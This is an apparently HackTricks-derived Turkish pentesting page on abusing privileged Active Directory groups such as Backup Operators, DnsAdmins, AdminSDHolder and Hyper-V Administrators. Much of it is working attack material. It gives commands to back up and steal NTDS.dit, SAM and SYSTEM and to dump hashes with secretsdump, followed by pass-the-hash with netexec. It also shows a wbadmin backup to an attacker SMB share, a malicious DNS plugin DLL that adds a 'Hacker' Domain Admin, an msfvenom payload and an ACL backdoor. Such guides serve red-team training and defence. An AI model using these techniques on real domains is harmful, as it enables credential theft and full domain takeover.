# Ayrıcalıklı Gruplar

{{#include ../../banners/hacktricks-training.md}}

## Well Known groups with administration privileges

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Bu grup, domain üzerinde yönetici olmayan hesaplar ve gruplar oluşturma yetkisine sahiptir. Ek olarak, Domain Controller (DC) üzerinde yerel oturum açmaya olanak verir.

Bu grubun üyelerini belirlemek için aşağıdaki komut çalıştırılır:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Yeni kullanıcı eklenmesine ve DC'ye yerel oturum açılmasına izin verilmektedir.

## AdminSDHolder grubu

**AdminSDHolder** grubunun Erişim Kontrol Listesi (ACL) çok önemlidir çünkü Active Directory içindeki tüm "korumalı gruplar" için izinleri belirler; buna yüksek ayrıcalıklı gruplar da dahildir. Bu mekanizma, yetkisiz değişiklikleri engelleyerek bu grupların güvenliğini sağlar.

Bir saldırgan, **AdminSDHolder** grubunun ACL'sini değiştirerek standart bir kullanıcıya tam izinler verebilir. Bu, söz konusu kullanıcıya tüm korumalı gruplar üzerinde fiilen tam kontrol sağlar. Bu kullanıcının izinleri değiştirilse veya kaldırılırsa, sistem tasarımından dolayı yaklaşık bir saat içinde otomatik olarak geri yüklenir.

Üyeleri gözden geçirmek ve izinleri değiştirmek için kullanılabilecek komutlar şunlardır:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Kurtarma sürecini hızlandırmak için bir script mevcuttur: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Daha fazla bilgi için: [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Bu gruba üyelik, silinmiş Active Directory nesnelerinin okunmasına izin verir; bu da hassas bilgilerin ifşa olmasına yol açabilir:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Domain Controller Access

DC üzerindeki dosyalara erişim, kullanıcı `Server Operators` grubunun bir üyesi olmadığı sürece kısıtlanmıştır; bu grup erişim düzeyini değiştirir.

### Yetki Yükseltme

Sysinternals'ten `PsService` veya `sc` kullanılarak servis izinleri incelenip değiştirilebilir. Örneğin `Server Operators` grubu belirli servisler üzerinde tam kontrole sahiptir; bu da rastgele komutların çalıştırılmasına ve yetki yükseltmeye izin verir:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Bu komut `Server Operators`'ın tam erişime sahip olduğunu ortaya çıkarır; bu, ayrıcalık yükseltme için servisleri manipüle etmeye olanak tanır.

## Backup Operators

`Backup Operators` grubuna üyelik, `SeBackup` ve `SeRestore` ayrıcalıkları nedeniyle `DC01` dosya sistemine erişim sağlar. Bu ayrıcalıklar, `FILE_FLAG_BACKUP_SEMANTICS` bayrağı kullanılarak açık izinler olmasa bile klasör dolaşımı, listeleme ve dosya kopyalama yeteneklerini mümkün kılar. Bu işlem için belirli scriptlerin kullanılması gerekir.

Grup üyelerini listelemek için şu komutu çalıştırın:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Yerel Saldırı

Bu ayrıcalıkları yerel düzeyde kullanmak için aşağıdaki adımlar uygulanır:

1. Gerekli kütüphaneleri içe aktarın:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege`'i etkinleştirin ve doğrulayın:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Kısıtlı dizinlere erişin ve dosyaları kopyalayın, örneğin:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Saldırısı

Domain Controller'ın dosya sistemine doğrudan erişim, domain kullanıcıları ve bilgisayarları için tüm `NTLM` hash'lerini içeren `NTDS.dit` veritabanının çalınmasına olanak tanır.

#### diskshadow.exe kullanarak

1. `C` sürücüsünün bir shadow copy'sini oluşturun:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Gölge kopyadan `NTDS.dit` dosyasını kopyalayın:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternatif olarak, dosya kopyalamak için `robocopy` kullanın:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Hash elde etmek için `SYSTEM` ve `SAM`'ı çıkarın:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit`'ten tüm hash'leri alın:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Çıkarım sonrası: Pass-the-Hash ile DA'ya
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### wbadmin.exe kullanımı

1. Saldırgan makinede SMB sunucusu için NTFS dosya sistemi oluşturun ve hedef makinede SMB kimlik bilgilerini önbelleğe alın.
2. Sistem yedeği almak ve `NTDS.dit` çıkarmak için `wbadmin.exe` kullanın:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Pratik bir gösterim için bkz. [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

**DnsAdmins** grubunun üyeleri, ayrıcalıklarını DNS sunucusunda (çoğunlukla Domain Controller'larda barındırılan) SYSTEM ayrıcalıklarıyla rastgele bir DLL yüklemek için kullanabilirler. Bu yetenek önemli suistimal potansiyeli sağlar.

DnsAdmins grubunun üyelerini listelemek için şunu kullanın:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Bu zafiyet, DNS hizmetinde (genellikle DCs içinde) SYSTEM ayrıcalıklarıyla keyfi kod çalıştırılmasına izin verir. Bu sorun 2021'de düzeltildi.

Üyeler, aşağıdaki gibi komutları kullanarak DNS sunucusunun keyfi bir DLL yüklemesini sağlayabilir (yerel olarak veya uzaktan bir paylaşımdan):
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DLL'in yüklenebilmesi için DNS hizmetinin yeniden başlatılması (bu ek izinler gerektirebilir) gereklidir:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Daha fazla ayrıntı için ired.team'e bakın.

#### Mimilib.dll

mimilib.dll'i komut çalıştırmak için kullanmak da mümkündür; belirli komutları veya reverse shells çalıştıracak şekilde değiştirilebilir. Daha fazla bilgi için [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html).

### MitM için WPAD Kaydı

DnsAdmins, global query block list'i devre dışı bıraktıktan sonra bir WPAD kaydı oluşturarak Man-in-the-Middle (MitM) saldırıları gerçekleştirebilir. Responder veya Inveigh gibi araçlar spoofing ve ağ trafiğini yakalamak için kullanılabilir.

### Olay Günlüğü Okuyucuları
Üyeler olay günlüklerine erişebilir ve potansiyel olarak açık metin parolalar veya komut çalıştırma ayrıntıları gibi hassas bilgiler bulabilir:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Bu grup domain nesnesi üzerindeki DACLs'i değiştirebilir ve potansiyel olarak DCSync ayrıcalıkları verebilir. Teknik olarak, bu grubu kötüye kullanarak yapılan privilege escalation yöntemleri Exchange-AD-Privesc GitHub repo'da ayrıntılı olarak açıklanmıştır.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administrators

Hyper-V Administrators, Hyper-V üzerinde tam erişime sahiptir; bu erişim sanallaştırılmış Domain Controllers üzerinde kontrol ele geçirmek için sömürülebilir. Bu, çalışır durumda olan DC'lerin klonlanmasını ve NTDS.dit dosyasından NTLM hash'lerinin çıkarılmasını içerir.

### İstismar Örneği

Firefox'un Mozilla Maintenance Service'i, Hyper-V Administrators tarafından SYSTEM olarak komut yürütmek için sömürülebilir. Bu, korumalı bir SYSTEM dosyasına hard link oluşturmayı ve onu kötü amaçlı bir çalıştırılabilir dosya ile değiştirmeyi içerir:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Not: Hard link exploitation son Windows güncellemelerinde hafifletildi.

## Group Policy Creators Owners

Bu grup, üyelerinin domain içinde Group Policies oluşturmasına izin verir. Ancak üyeler, Group Policies'i kullanıcılara veya gruplara uygulayamaz veya mevcut GPO'ları düzenleyemez.

## Organization Management

**Microsoft Exchange**'in konuşlandırıldığı ortamlarda, **Organization Management** olarak bilinen özel bir grup önemli yeteneklere sahiptir. Bu grup, **tüm domain kullanıcılarının posta kutularına erişim** ayrıcalığına sahiptir ve **'Microsoft Exchange Security Groups'** Organizational Unit (OU) üzerinde tam kontrole sahiptir. Bu kontrol, ayrıcalık yükseltme için istismar edilebilecek **`Exchange Windows Permissions`** grubunu içerir.

### Privilege Exploitation and Commands

#### Print Operators

**Print Operators** grubunun üyeleri birkaç ayrıcalığa sahiptir; bunların arasında **`SeLoadDriverPrivilege`** de bulunur; bu, onların **log on locally to a Domain Controller**, kapatma ve yazıcıları yönetme yetkisine sahip olmalarını sağlar. Bu ayrıcalıkları istismar etmek için, özellikle **`SeLoadDriverPrivilege`** yükseltilmemiş bir bağlamda görünmüyorsa, User Account Control (UAC) atlatılması gerekir.

Bu grubun üyelerini listelemek için aşağıdaki PowerShell komutu kullanılır:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
**`SeLoadDriverPrivilege`** ile ilgili daha ayrıntılı exploitation techniques hakkında bilgi için belirli güvenlik kaynaklarına başvurulmalıdır.

#### Uzak Masaüstü Kullanıcıları

Bu grubun üyelerine Remote Desktop Protocol (RDP) üzerinden PC'lere erişim izni verilir. Bu üyeleri listelemek için PowerShell komutları mevcuttur:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDP'yi istismar etmeye dair daha fazla bilgi özel pentesting kaynaklarında bulunabilir.

#### Uzaktan Yönetim Kullanıcıları

Üyeler **Windows Remote Management (WinRM)** üzerinden PC'lere erişebilir. Bu üyelerin enumeration yoluyla belirlenmesi şu yollarla gerçekleştirilir:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM** ile ilgili exploitation techniques için ilgili dokümantasyon incelenmelidir.

#### Sunucu Operatörleri

Bu grup, Etki Alanı Denetleyicileri üzerinde çeşitli yapılandırmaları gerçekleştirme izinlerine sahiptir; bunlar arasında yedekleme ve geri yükleme ayrıcalıkları, sistem saatini değiştirme ve sistemi kapatma yer alır. Üyeleri listelemek için verilen komut şudur:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Referanslar <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
